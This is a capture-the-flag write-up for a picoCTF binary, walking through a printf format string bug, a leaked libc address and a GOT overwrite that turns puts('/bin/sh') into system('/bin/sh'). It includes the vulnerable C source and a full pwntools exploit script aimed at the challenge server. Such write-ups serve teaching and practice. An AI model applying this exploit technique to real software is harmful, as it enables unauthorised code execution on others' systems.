---
title: how to make your program spill tea
date: 2025-12-17
---

![Format String Challenge](/images/fmt-str-chal.png)

## Introduction

In this challenge, we are tasked with exploiting a binary named **format-string-3**. We are provided with the following artifacts:

*   **format-string-3**: The target ELF binary.
*   **libc.so.6**: The standard C library used by the binary.
*   **ld-linux-x86-64.so.2**: The dynamic linker.
*   **format-string-3.c**: The source code.

Our goal is to analyze the binary's behavior, identify a vulnerability, and exploit it to spawn a shell.

## Source Code Analysis

Let's examine the provided source code, specifically the `main()` function:

```c
int main() {
    char *all_strings[MAX_STRINGS] = {NULL};
    char buf[1024] = {'\0'};

    setup();
    hello();    

    fgets(buf, 1024, stdin);    
    printf(buf);

    puts(normal_string);

    return 0;
}
```

Two critical things happen here:

1.  **Vulnerable `printf`**: `printf(buf)` prints user input directly without a format specifier (like `%s`). This allows us to supply our own format specifiers (e.g., `%x`, `%p`, `%n`) to read from or write to the stack and arbitrary memory locations.
2.  **Target Function**: The program ends by calling `puts(normal_string)`, where `normal_string` is `"/bin/sh"`.

If we can manipulate the program so that `puts` is replaced by `system`, the call `puts("/bin/sh")` effectively becomes `system("/bin/sh")`, giving us a shell.

### The Leak

Before `main` processes our input, the `hello()` function is called:

```c
void hello() {
    puts("Howdy gamers!");
    printf("Okay I'll be nice. Here's the address of setvbuf in libc: %p\n", &setvbuf);
}
```

This function helpfully prints the runtime address of `setvbuf`. This is crucial because modern systems use **ASLR (Address Space Layout Randomization)** and **PIE (Position Independent Executable)**, meaning memory addresses change every time the program runs.

![Leak Output](/images/fmt-str-1.png)

By knowing the runtime address of `setvbuf` and its static offset in the provided `libc.so.6`, we can calculate the **base address of libc**. Once we have the base address, we can find the runtime address of any other function in libc, including `system`.

## Vulnerability & Strategy

### The Plan

1.  **Capture the Leak**: Read the address of `setvbuf` from the program's initial output.
2.  **Calculate Addresses**:
    *   Compute libc base: `libc_base = setvbuf_leak - setvbuf_offset`
    *   Compute `system` address: `system_addr = libc_base + system_offset`
3.  **Overwrite GOT**: Use the format string vulnerability in `printf(buf)` to overwrite the **Global Offset Table (GOT)** entry for `puts` with the address of `system`.

### Understanding the GOT/PLT

The **Global Offset Table (GOT)** is used by dynamically linked programs to resolve function addresses at runtime. When `puts` is called, the program looks up its address in the GOT. If we overwrite that entry with the address of `system`, the program will jump to `system` instead.

![Program Segfaults on Bad Input](/images/fmt-str-3.png)
*Figure: We can verify control over execution flow by crashing the program.*

## Debugging & Exploitation

To verify our strategy, we can use GDB. We need to find the location of `puts` in the GOT.

![GDB Disassembly](/images/fmt-str-5.png)

In GDB, we can inspect the PLT and GOT entries. The disassembly shows calls to `puts@plt`, which eventually jumps to the address stored in `puts@got`.

![GDB PLT Analysis](/images/fmt-str-6.png)

### Calculating Offsets

Since we have the `libc.so.6` file, the offsets are static. We can calculate the distance between `setvbuf` and `system` beforehand or let `pwntools` handle it dynamically.

![Offset Calculation](/images/fmt-str-7.png)

## The Exploit Script

We'll use **pwntools** to automate the interaction. It handles the arithmetic, format string payload generation, and communication.

```python
from pwn import *

# Context setup
context.binary = ELF('./format-string-3')
context.update(arch='amd64', os='linux', bits=64)
elf = context.binary
libc = ELF('./libc.so.6') # Load the provided libc

HOST, PORT = 'rhea.picoctf.net', 60973
REMOTE = True

# Start process or connect to remote
s = remote(HOST, PORT) if REMOTE else elf.process()

# 1. Parse the leak
s.recvuntil(b"libc: ")
leak_line = s.recvline().strip()
setvbuf_addr = int(leak_line, 16)
log.info(f"Leaked setvbuf: {hex(setvbuf_addr)}")

# 2. Calculate base and system address
libc.address = setvbuf_addr - libc.symbols['setvbuf']
system_addr = libc.symbols['system']
log.info(f"Libc Base: {hex(libc.address)}")
log.info(f"System Address: {hex(system_addr)}")

# 3. Overwrite puts@got with system
# We use pwntools' fmtstr_payload to automatically generate the write payload
puts_got = elf.got['puts']

# FmtStr helper to find the offset automatically (optional, usually 6 or 8 on 64-bit)
# For this challenge, we can likely assume standard offsets or find it manually.
# Let's assume we found the format string offset is 38 (based on challenge context).
format_string_offset = 38 

payload = fmtstr_payload(format_string_offset, {puts_got: system_addr})

s.sendline(payload)
s.interactive()
```

### Running the Exploit

When we run the script:
1.  It catches the `setvbuf` leak.
2.  Calculates the address of `system`.
3.  Sends a payload that writes the `system` address into the `puts` GOT entry.
4.  When `puts("/bin/sh")` is called next, `system("/bin/sh")` executes instead.

![Final Shell](/images/fmt-str-8.png)

And just like that, we have a shell!

![Success Meme](/images/fmt-str-10.png)

**References:**
*   [Hack Using Global Offset Table](https://nuc13us.wordpress.com/2015/12/25/hack-using-global-offset-table/)
